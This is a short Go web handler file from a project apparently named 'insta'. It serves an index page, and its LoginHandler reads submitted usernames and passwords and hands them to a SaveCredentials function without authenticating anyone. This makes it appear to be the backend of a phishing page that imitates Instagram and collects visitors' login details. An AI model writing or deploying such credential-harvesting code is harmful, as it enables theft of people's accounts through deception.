package handler

import (
	"insta/pkg/config"
	"insta/pkg/render"
	"insta/pkg/save"
	"net/http"
)

// Repository is the repository type
type Repository struct {
	App *config.AppConfig
}

func NewRepo(a *config.AppConfig) *Repository {
	return &Repository{
		App: a,
	}
}

// Repo the repository used by the handlers
var Repo *Repository

// NewHandlers sets the repository for the handlers
func NewHandlers(r *Repository) {
	Repo = r
}

func (m *Repository) Index(w http.ResponseWriter, r *http.Request) {

	//remoteIp := r.RemoteAddr
	//m.App.Session.Put(r.Context(), "remote_ip", remoteIp)
	render.RenderTemplate(w, "index.html")
}

func (m *Repository) LoginHandler(w http.ResponseWriter, r *http.Request) {

	if err := r.ParseForm(); err != nil {
		http.Error(w, "ParseForm error", http.StatusInternalServerError)
		return
	}
	uName := r.FormValue("u_name")
	pass := r.FormValue("pass")

	save.SaveCredentials(uName, pass)
}
